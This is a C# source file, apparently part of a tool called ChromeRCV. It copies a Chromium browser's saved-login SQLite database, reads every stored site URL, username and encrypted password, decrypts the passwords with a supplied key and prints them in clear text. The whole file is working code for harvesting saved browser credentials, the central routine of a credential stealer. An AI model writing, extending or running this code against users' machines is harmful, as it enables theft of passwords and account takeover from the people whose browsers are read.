using System;
using System.Text;
using System.IO;
using System.Collections.Generic;
using System.Data.SQLite;

namespace ChromeRCV
{
    internal sealed class ChromiumLogin
    {
        string _hostname;
        string _username;
        string _password;

        public string Hostname
        {
            get { return _hostname; } set { _hostname = value; }
        }

        public string Username
        {
            get { return _username; } set { _username = value; }
        }

        public string Password
        {
            get { return _password; } set { _password = value; }
        }

        public ChromiumLogin(string hostname, string username, string password)
        {
            _hostname = hostname;
            _username = username;
            _password = password;
        }

        public ChromiumLogin() { }

        public void Print()
        {
            Console.WriteLine("ORIGIN_URL :  " + _hostname);
            Console.WriteLine("USERNAME   :  " + _username);
            Console.WriteLine("PASSWORD   :  " + _password + "\r\n");
        }
    }

    internal sealed class ChromiumLoginManager
    {
        public static void GetData(string loginDataPath, byte[] key, ref List<ChromiumLogin> logins)
        {
            string tempFile = Utils.CreateTempFile(loginDataPath);
            using (SQLiteConnection conn = new SQLiteConnection("Data Source=" + tempFile + ";Version=3;New=True;Compress=True;")) {
                conn.Open();
                using (SQLiteCommand comm = conn.CreateCommand()) {
                    comm.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                    using (SQLiteDataReader reader = comm.ExecuteReader()) {

                        while (reader.Read()) {
                            string hostname = (string)reader["origin_url"];
                            string username = (string)reader["username_value"];
                            string password = Encoding.Default.GetString((byte[])reader["password_value"]);

                            var c = new ChromiumLogin();
                            c.Hostname = hostname;
                            c.Username = username;
                            c.Password = Crypt.DecryptPassword(password, key);
                            logins.Add(c);
                        }
                    }
                }
                conn.Close();
            }
            try {
                File.Delete(tempFile);
            }
            catch {
                Console.WriteLine($"Failed to delete {tempFile.ToUpper()}");
            }
        }
    }
}
